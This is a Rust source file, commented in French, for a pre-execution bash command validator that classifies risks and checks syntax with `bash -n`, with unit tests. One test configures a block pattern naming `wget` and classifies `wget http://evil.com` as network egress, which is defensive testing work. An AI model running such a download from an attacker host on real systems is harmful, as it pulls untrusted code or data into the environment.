//! Validateur pré-exécution pour `BashExecutor`.
//!
//! `BashValidator` regroupe les deux vérifications appliquées avant tout spawn de processus :
//!
//! 1. **Classification des risques** (synchrone, sans I/O) — délégue à [`RiskClassifier`].
//!    Retourne immédiatement si un pattern de risque est détecté.
//!
//! 2. **Validation syntaxique** (asynchrone, `bash -n -c`) — invoque un sous-processus `bash`
//!    en mode dry-run pour détecter les erreurs de syntaxe sans exécuter la commande.
//!    Soumis à un timeout configurable (défaut : 1 000 ms).
//!
//! L'ordre d'application est imposé par l'architecture :
//! classification → syntaxe → exécution. Cela garantit que les commandes à risque
//! ne consomment jamais une invocation du StepBudget (Principe #4 — Fail fast).

use std::time::Duration;

use apollia_core::BashValidatorConfig;
use tokio::process::Command;

use crate::tools::bash_executor::BashExecutorError;
use crate::tools::risk_classifier::{RiskCategory, RiskClassifier};

/// Validateur pré-exécution combinant classification des risques et contrôle syntaxique.
///
/// Instancié depuis [`BashValidatorConfig`] — la configuration est immuable après construction.
/// `BashValidator` est un champ de `BashExecutor` et ne doit pas être partagé entre acteurs.
pub struct BashValidator {
    config: BashValidatorConfig,
}

impl BashValidator {
    /// Construit un `BashValidator` depuis sa configuration.
    pub fn new(config: BashValidatorConfig) -> Self {
        Self { config }
    }

    /// Retourne les catégories de risque détectées pour `cmd`.
    ///
    /// Délègue à [`RiskClassifier::classify`]. La liste est vide si aucun risque n'est détecté.
    pub fn classify_risks(&self, cmd: &str) -> Vec<RiskCategory> {
        RiskClassifier::classify(cmd, &self.config)
    }

    /// Valide la syntaxe bash de `cmd` via `bash -n -c`.
    ///
    /// Exécute `bash -n -c <cmd>` dans un sous-processus isolé (mode dry-run — aucune commande
    /// n'est réellement exécutée). Si `bash` signale une erreur de syntaxe (exit code ≠ 0),
    /// retourne [`BashExecutorError::SyntaxError`] avec le stderr de `bash -n`.
    ///
    /// Le sous-processus est soumis au timeout `syntax_check_timeout_ms` configuré.
    /// Au-delà, le processus est tué et [`BashExecutorError::SyntaxValidationTimeout`] est retourné.
    ///
    /// # Errors
    ///
    /// - [`BashExecutorError::SyntaxError`] — `bash -n` a signalé une erreur de syntaxe.
    /// - [`BashExecutorError::SyntaxValidationTimeout`] — timeout dépassé.
    /// - [`BashExecutorError::SpawnFailed`] — `bash` n'est pas disponible ou le spawn a échoué.
    pub async fn validate_syntax(&self, cmd: &str) -> Result<(), BashExecutorError> {
        let timeout = Duration::from_millis(self.config.syntax_check_timeout_ms);

        let mut child = Command::new("bash")
            .args(["-n", "-c", cmd])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| BashExecutorError::SpawnFailed(e.to_string()))?;

        let mut stderr_pipe = child.stderr.take().ok_or_else(|| {
            BashExecutorError::SpawnFailed("bash -n: stderr pipe missing".to_string())
        })?;

        // Drainer stderr dans une tâche de fond pour éviter le deadlock sur pipe plein.
        let stderr_task = tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut buf = Vec::new();
            stderr_pipe.read_to_end(&mut buf).await.map(|_| buf)
        });

        let status = tokio::select! {
            result = child.wait() => {
                result.map_err(|e| BashExecutorError::SpawnFailed(e.to_string()))?
            }
            _ = tokio::time::sleep(timeout) => {
                stderr_task.abort();
                let _ = child.kill().await;
                let _ = child.wait().await;
                return Err(BashExecutorError::SyntaxValidationTimeout);
            }
        };

        let stderr_bytes = stderr_task
            .await
            .map_err(|e| BashExecutorError::SpawnFailed(e.to_string()))?
            .map_err(|e| BashExecutorError::SpawnFailed(e.to_string()))?;

        if !status.success() {
            let detail = String::from_utf8_lossy(&stderr_bytes).trim().to_owned();
            return Err(BashExecutorError::SyntaxError {
                cmd: cmd.to_owned(),
                detail,
            });
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_validator() -> BashValidator {
        BashValidator::new(BashValidatorConfig::default())
    }

    #[tokio::test]
    async fn bash_validator_rejects_invalid_syntax() {
        // GIVEN un BashValidator avec config par défaut
        let validator = default_validator();
        // WHEN commande bash syntaxiquement invalide
        let result = validator
            .validate_syntax("if [ -z $VAR; then echo ok")
            .await;
        // THEN erreur de syntaxe retournée
        assert!(
            matches!(result, Err(BashExecutorError::SyntaxError { .. })),
            "expected SyntaxError, got: {result:?}"
        );
    }

    #[tokio::test]
    async fn bash_validator_accepts_valid_complex_command() {
        // GIVEN un BashValidator avec config par défaut
        let validator = default_validator();
        // WHEN commande bash complexe mais syntaxiquement correcte
        let result = validator
            .validate_syntax("if [ -z \"$VAR\" ]; then echo ok; fi")
            .await;
        // THEN aucune erreur
        assert!(result.is_ok(), "expected Ok, got: {result:?}");
    }

    #[tokio::test]
    async fn bash_validator_accepts_simple_command() {
        // GIVEN
        let validator = default_validator();
        // WHEN
        let result = validator.validate_syntax("echo hello world").await;
        // THEN
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn bash_validator_rejects_unclosed_quote() {
        // GIVEN
        let validator = default_validator();
        // WHEN chaîne non fermée
        let result = validator.validate_syntax("echo \"unclosed").await;
        // THEN
        assert!(matches!(result, Err(BashExecutorError::SyntaxError { .. })));
    }

    #[test]
    fn bash_validator_classify_risks_delegates_to_classifier() {
        // GIVEN validator avec pattern réseau configuré
        let config = BashValidatorConfig {
            block_network_egress: true,
            network_egress_patterns: vec!["wget".to_owned()],
            ..BashValidatorConfig::default()
        };
        let validator = BashValidator::new(config);
        // WHEN
        let risks = validator.classify_risks("wget http://evil.com");
        // THEN
        use crate::tools::risk_classifier::RiskCategory;
        assert!(risks.contains(&RiskCategory::NetworkEgress));
    }
}
